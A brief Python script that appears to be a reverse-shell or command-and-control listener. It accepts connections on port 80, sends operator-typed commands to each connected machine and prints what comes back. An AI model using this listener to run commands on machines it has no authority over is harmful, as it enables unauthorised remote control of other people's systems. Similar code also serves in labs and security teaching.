import socket
import threading

def handle_client(client_socket):
    while True:
        command = input("Enter command: ")
        if command.lower() == "exit":
            break
        if command:
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)

def start_server(host='0.0.0.0', port=80):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()